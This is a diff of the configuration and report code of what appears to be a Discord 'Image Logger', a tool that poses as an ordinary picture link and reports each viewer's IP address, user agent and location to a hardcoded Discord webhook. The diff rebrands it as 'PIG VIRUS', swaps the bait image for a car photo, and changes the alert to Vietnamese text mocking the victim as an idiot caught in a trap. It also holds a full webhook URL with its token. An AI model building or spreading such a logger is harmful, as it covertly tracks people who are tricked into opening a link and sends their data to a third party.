@@ -14,12 +14,12 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1357331351044493433/zK2nCktXZkznTfq4ruOI4cfbgCuDH9XRrrHrR0FBmYyiEZb2OMr6rtj5DUpTFz5ix07E",
-    "image": "https://i.pinimg.com/564x/76/f6/eb/76f6eb36e0b18bfab0674f3d64b0db04.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://kovar.vn/wp-content/uploads/2020/08/bmw-i8.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "PIG VIRUS", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -145,9 +145,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - IP Logged",
+            "title": "PIG VIRUS",
             "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
+            "description": f"""**Một Thằng Ngu Đã Dính Bẫy**
 
 **Endpoint:** `{endpoint}`
             
